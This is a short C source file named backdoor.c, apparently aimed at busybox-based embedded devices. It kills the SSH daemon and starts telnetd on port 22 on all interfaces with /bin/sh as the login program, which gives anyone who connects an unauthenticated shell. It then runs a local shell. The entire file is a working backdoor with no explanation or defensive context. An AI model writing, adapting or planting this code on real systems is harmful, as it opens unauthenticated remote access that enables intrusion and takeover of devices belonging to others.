/*gcc  -static  backdoor.c -o backdoor*/
#include <stdio.h>
void shell() {
system("/bin/busybox ls");
system("/bin/busybox id");
system("/bin/busybox killall sshd && /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22");
system("/bin/busybox sh");
}

int main(int argc,char const*argv[])
{
shell();
return 0;
}
